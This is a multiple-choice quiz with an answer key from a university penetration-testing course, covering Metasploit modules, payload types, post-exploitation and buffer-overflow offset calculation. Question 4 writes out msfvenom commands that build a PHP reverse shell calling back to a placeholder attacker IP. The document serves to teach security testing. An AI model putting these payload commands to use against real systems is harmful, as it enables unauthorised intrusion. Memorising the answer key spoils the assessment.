# Quiz: Module 07 — Exploitation Techniques

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

**Instructions:** Select the single best answer for each question. Questions are aligned to CompTIA PenTest+ PT0-002 Domain 3: Attacks and Exploits.

---

### Question 1

A penetration tester wants to verify that a target system is vulnerable to a specific exploit without actually exploiting it. Which Metasploit command accomplishes this?

- A) `run`
- B) `exploit -j`
- C) `check`
- D) `info`

**Correct Answer:** C

**Distractor Analysis:**

- **Why C is correct:** The `check` command in msfconsole sends specific probes to the target to determine whether it is vulnerable to the selected exploit, without delivering the payload or establishing a session. Not all modules support `check`, but when available it is a valuable verification step that can be documented in the report.
- **Why A is incorrect:** `run` executes the exploit including payload delivery. If successful it compromises the target.
- **Why B is incorrect:** `exploit -j` runs the exploit as a background job — it still attempts full exploitation.
- **Why D is incorrect:** `info` displays the module's description, options, and metadata. It reads from the local module database and does not contact the target at all.

---

### Question 2

A tester is selecting a Metasploit payload for an engagement. They need the entire payload delivered in a single transfer because the target environment has strict outbound network filtering that may prevent the second-stage download. Which payload type is most appropriate?

- A) Staged payload — `windows/x64/meterpreter/reverse_tcp`
- B) Stageless payload — `windows/x64/meterpreter_reverse_tcp`
- C) Bind payload — `windows/x64/shell/bind_tcp`
- D) Encoder — `x86/shikata_ga_nai`

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Stageless payloads (indicated by underscore `_` between the payload type and connection method) contain the complete payload in a single binary with no second-stage download. This is the correct choice when network filtering might block the stage download that staged payloads require.
- **Why A is incorrect:** The staged payload `meterpreter/reverse_tcp` (indicated by slash `/`) requires a two-stage delivery: the initial stager connects back to download the full Meterpreter stage. This would be blocked by the described network filtering.
- **Why C is incorrect:** A bind payload opens a listening port on the target and waits for the attacker to connect inbound. This is unrelated to the staged/stageless decision, and bind payloads face their own firewall challenges for inbound connections.
- **Why D is incorrect:** An encoder is not a payload — it is used to obfuscate payloads to evade detection. Selecting an encoder does not determine whether the payload is staged or stageless.

---

### Question 3

After successful exploitation of a target, a penetration tester has a Meterpreter session. The tester runs `getuid` and receives `Server username: www-data`. What does this indicate and what should the tester's next step be?

- A) The tester has SYSTEM-level access; no further privilege escalation is needed
- B) The tester has access as a low-privileged web server process account; privilege escalation to root or SYSTEM should be attempted next
- C) The session has failed and `www-data` indicates a connection error
- D) The `www-data` account has full administrative access on all Linux systems by default

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** `www-data` is the standard low-privilege account used by Apache and Nginx web servers on Linux/Debian systems. It has access only to web server files and directories — far from root. The professional next step is privilege escalation to gain elevated access and fully demonstrate the impact of the vulnerability.
- **Why A is incorrect:** `www-data` is a low-privilege service account, not SYSTEM or root. SYSTEM is the highest Windows privilege; on Linux the equivalent is root (uid=0).
- **Why C is incorrect:** Receiving a username in response to `getuid` confirms a working session. An error would appear as an exception or no response.
- **Why D is incorrect:** `www-data` has intentionally limited permissions scoped to web content directories. It cannot read `/etc/shadow`, escalate privileges, or access most system resources without an additional privilege escalation vulnerability.

---

### Question 4

A penetration tester needs to generate a PHP reverse shell payload that will be uploaded to a vulnerable web application. Which msfvenom command is correct?

- A) `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f raw -o shell.php`
- B) `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o shell.php`
- C) `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.php`
- D) `msfvenom --list payloads LHOST=10.10.10.5 -f php -o shell.php`

**Correct Answer:** A

**Distractor Analysis:**

- **Why A is correct:** This command specifies a PHP payload (`php/meterpreter_reverse_tcp`), the attacker's IP and port, and the output format `raw` — which produces a plain PHP file. The `-o shell.php` names the output file correctly. PHP webshells must use `-f raw` to produce interpretable PHP code.
- **Why B is incorrect:** This specifies a Windows 64-bit EXE payload with `-f exe`. Even named `shell.php`, this would produce a Windows PE binary that would not execute as PHP code.
- **Why C is incorrect:** This generates a Linux ELF binary with `-f elf`. An ELF binary named `.php` would not execute as PHP in a web application context.
- **Why D is incorrect:** `--list payloads` is a listing command for displaying available payloads. Adding connection parameters and output flags to a listing command produces an error, not a payload file.

---

### Question 5

In a stack-based buffer overflow exploitation workflow, what is the purpose of using `msf-pattern_create` and `msf-pattern_offset`?

- A) To generate shellcode that avoids bad characters in the target application's input handling
- B) To create a unique non-repeating pattern that, when placed in EIP after a crash, allows precise calculation of the exact byte offset needed to control the instruction pointer
- C) To automatically identify the JMP ESP gadget address in the target executable's memory
- D) To encode the final shellcode payload to bypass antivirus detection before delivery

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** `msf-pattern_create` generates a unique cyclic pattern where every 4-byte subsequence appears only once. When an application crashes and EIP contains part of this pattern, `msf-pattern_offset` takes that 4-byte value and returns the exact byte position — the precise number of bytes needed between the start of the buffer and the EIP overwrite location. This replaces trial-and-error offset finding.
- **Why A is incorrect:** Bad character identification is a separate step performed by sending all byte values (`\x00` through `\xFF`) and observing which cause truncation or corruption in the vulnerable application. Pattern creation and offset tools serve a different purpose.
- **Why C is incorrect:** JMP ESP gadget discovery is performed by tools like `mona.py` in Immunity Debugger or `ROPgadget`. Pattern tools do not locate gadgets.
- **Why D is incorrect:** Shellcode encoding is performed by specifying an encoder with `-e` in msfvenom. Pattern tools have no encoding function.

---

### Question 6

A penetration tester has established a Meterpreter session and wants to run a post-exploitation module to identify potential local privilege escalation paths without manually researching every installed application and service. Which command is most appropriate?

- A) `run post/windows/gather/hashdump`
- B) `run post/multi/recon/local_exploit_suggester`
- C) `run post/windows/manage/enable_rdp`
- D) `run autoroute -s 10.10.10.0/24`

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** The `local_exploit_suggester` post-exploitation module examines the compromised system's OS version, architecture, installed patches, and running services, then returns a list of Metasploit privilege escalation exploits that are likely applicable. It significantly accelerates the privilege escalation research phase.
- **Why A is incorrect:** `hashdump` extracts local password hashes from the Windows SAM database. It is a credential gathering module, not a privilege escalation suggester. It also typically requires SYSTEM-level access to run.
- **Why C is incorrect:** `enable_rdp` enables Remote Desktop Protocol access on the compromised Windows system. This is a persistence/access mechanism, not a privilege escalation identification tool.
- **Why D is incorrect:** `autoroute` adds routing rules to pivot through the compromised host to reach additional network segments. It is a pivoting tool, not related to privilege escalation.

---

### Question 7

What is the fundamental difference between a Metasploit `exploit` module and an `auxiliary` module?

- A) Exploit modules run only on Windows targets; auxiliary modules run only on Linux targets
- B) Exploit modules deliver a payload to gain code execution; auxiliary modules perform tasks like scanning, brute forcing, or fuzzing without delivering a payload
- C) Auxiliary modules are faster than exploit modules because they do not require network connectivity
- D) Exploit modules can only be used with Meterpreter payloads; auxiliary modules support any payload type

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** The defining distinction is payload delivery. An exploit module exploits a vulnerability to deliver and execute a payload, resulting in a session. An auxiliary module performs reconnaissance, testing, or attack tasks — scanning, credential brute forcing, fuzzing, denial-of-service testing — without establishing a persistent session via payload.
- **Why A is incorrect:** Both exploit and auxiliary modules support multiple operating system platforms. The platform compatibility is determined by individual module design, not the module type.
- **Why C is incorrect:** Auxiliary modules absolutely require network connectivity — scanner modules, brute-force modules, and fuzzing modules all send network traffic to targets. Speed differences exist between specific modules but are not a categorical distinction of module type.
- **Why D is incorrect:** Exploit modules support a wide variety of payload types including basic shells, Meterpreter, PowerShell, and others. The available payloads depend on the specific exploit module's compatibility list, not a blanket restriction.

---

### Question 8

Meterpreter is preferred over a basic command shell payload in many penetration tests because of a specific architectural characteristic. What is that characteristic, and why does it matter?

- A) Meterpreter communicates over UDP, making it faster than shell payloads that use TCP
- B) Meterpreter runs entirely in memory without writing files to disk, reducing forensic evidence and evading file-based antivirus detection
- C) Meterpreter encrypts all keystrokes entered on the target system before transmitting them to the attacker
- D) Meterpreter automatically escalates privileges to SYSTEM on Windows when it is first loaded

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Meterpreter operates entirely in memory — injected into a running process and never written to disk as a standalone file. This means file-based antivirus scanners that monitor the filesystem cannot detect it through file scans, and forensic investigators face greater difficulty identifying it in disk evidence. This is a core exam concept about Meterpreter's stealth advantage.
- **Why A is incorrect:** Meterpreter uses TCP by default (and can use HTTPS). The communication protocol choice is configurable but not the architectural characteristic that makes Meterpreter distinctive.
- **Why C is incorrect:** Meterpreter does not encrypt keystrokes for transmission to the attacker. The `keyscan_start/keyscan_dump` Meterpreter commands capture keystrokes, but encryption of those keystrokes is not Meterpreter's defining characteristic.
- **Why D is incorrect:** Meterpreter does not automatically escalate privileges. Privilege escalation can be attempted with the `getsystem` command, which tries several techniques, but success depends on available vulnerabilities and is not automatic or guaranteed.

---

### Question 9

A tester uses the Metasploit `multi/handler` module with a matching payload. What is the purpose of this module?

- A) It automates the selection of the best exploit for a given target based on vulnerability data
- B) It acts as a generic listener that receives connections from payloads delivered through other means (msfvenom-generated files, manual exploitation)
- C) It handles multiple simultaneous exploit attempts against different targets
- D) It converts Meterpreter sessions into standard command shells for compatibility with post-exploitation tools

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** `exploit/multi/handler` is a listener — it waits for incoming connections from previously deployed payloads. When a tester generates a payload with msfvenom and delivers it through a web upload, email attachment, or USB, the `multi/handler` with the matching payload configuration catches the incoming connection and establishes the Meterpreter or shell session.
- **Why A is incorrect:** Automated exploit selection based on vulnerability data is not a Metasploit feature built into `multi/handler`. This is more characteristic of commercial scanners or the `db_autopwn` plugin (which is no longer included by default).
- **Why C is incorrect:** While `multi/handler` can be run as a background job to handle multiple incoming connections, its purpose is not simultaneous exploit management — it is a passive listener waiting for payload connections.
- **Why D is incorrect:** `multi/handler` does not perform session type conversion. Session upgrading from shell to Meterpreter is done through `sessions -u [id]` which uses a separate upgrade module.

---

### Question 10

During a penetration test, a tester discovers a buffer overflow vulnerability in a custom application. The tester generates a 2000-byte pattern with `msf-pattern_create -l 2000`, crashes the application, and observes that EIP contains the value `0x41326641`. The tester then runs `msf-pattern_offset -q 0x41326641` and receives the result `[*] Exact match at offset 524`. What does offset 524 mean in the context of exploiting this vulnerability?

- A) The application has 524 total bytes of memory allocated for user input
- B) The exploit payload must be exactly 524 bytes long to succeed
- C) The first 524 bytes of the input fill the buffer and saved base pointer before reaching the saved return address (EIP); bytes 525–528 overwrite EIP
- D) The JMP ESP instruction is located at memory address 0x00000524 in the application

**Correct Answer:** C

**Distractor Analysis:**

- **Why C is correct:** An offset of 524 means that the unique 4-byte pattern that landed in EIP begins at byte position 524 of the input. The correct exploit structure is: 524 bytes of padding (As), followed by the 4-byte address to place in EIP (the JMP ESP or ROP gadget address), followed by any additional instructions or shellcode. Bytes 525–528 directly overwrite the saved return address.
- **Why A is incorrect:** The offset is the distance to EIP within the exploit buffer, not the total memory allocation. The total buffer allocation is determined by the application's code and may be smaller than 524 bytes — overflow occurs precisely because input exceeds the buffer.
- **Why B is incorrect:** The total exploit payload is significantly longer than 524 bytes. After the 524-byte padding and 4-byte EIP overwrite, additional shellcode (typically 100–500+ bytes) is appended.
- **Why D is incorrect:** The offset value from `msf-pattern_offset` is a byte count within the input pattern. JMP ESP gadget addresses are found separately using debugger tools like mona.py or ROPgadget and are actual memory addresses in the target process space.

---

**Proprietary and Confidential. Not for disclosure outside of Texas Wesleyan University course use.**
